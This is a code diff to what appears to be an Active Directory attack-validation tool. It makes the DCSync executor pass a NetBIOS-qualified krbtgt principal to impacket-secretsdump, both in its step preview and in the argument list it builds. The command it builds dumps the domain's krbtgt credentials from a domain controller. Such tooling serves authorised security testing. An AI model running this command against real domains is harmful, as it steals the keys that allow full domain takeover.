@@ -51,6 +51,17 @@ _RE_DCSYNC_KRBTGT = re.compile(
     re.I | re.M)
 
 
+def _krbtgt_target(cfg) -> str:
+    """The krbtgt principal, NetBIOS-domain-qualified so DRSUAPI name translation is
+    unambiguous in a MULTI-DOMAIN forest: a bare ``krbtgt`` raises
+    ``ERROR_DS_NAME_ERROR_NOT_UNIQUE`` through the GC (impacket itself tells you to
+    use the NetBIOS form). Harmless in a single domain, so it is always used.
+    NetBIOS defaults to the FQDN's first label (the usual case); override via
+    ``cfg.netbios_domain`` on the rare domain whose NetBIOS name differs."""
+    netbios = (getattr(cfg, "netbios_domain", None) or (cfg.domain or "").split(".", 1)[0]).strip()
+    return f"{netbios.upper()}/krbtgt" if netbios else "krbtgt"
+
+
 class DCSyncExecutor(ValidationExecutor):
     technique = "DCSYNC"
     technique_class = "dcsync"
@@ -87,8 +98,9 @@ class DCSyncExecutor(ValidationExecutor):
     def steps_preview(self, ctx, finding, params) -> list[str]:
         v = values(params)
         return [
-            f"impacket-secretsdump -just-dc-user krbtgt -dc-ip {ctx.config.dc_ip} "
-            f"<ctx creds/hash/-k>@{v['dc_host']}  (DCSync; replication_dump, read-only)",
+            f"impacket-secretsdump -just-dc-user {_krbtgt_target(ctx.config)} "
+            f"-dc-ip {ctx.config.dc_ip} <ctx creds/hash/-k>@{v['dc_host']}  "
+            "(DCSync; replication_dump, read-only)",
         ]
 
     # ---------------------------------------------------------------- auth argv
@@ -112,7 +124,7 @@ class DCSyncExecutor(ValidationExecutor):
         ``:pass`` target so :func:`redact_argv` masks them.
         """
         caps = input_caps or {}
-        argv = ["impacket-secretsdump", "-just-dc-user", "krbtgt", "-dc-ip", cfg.dc_ip]
+        argv = ["impacket-secretsdump", "-just-dc-user", _krbtgt_target(cfg), "-dc-ip", cfg.dc_ip]
         threaded_principal = caps.get("principal")
         if caps.get("ccache"):               # composed: auth as the front's principal via KRB5CCNAME
             user = threaded_principal or cfg.username or ""
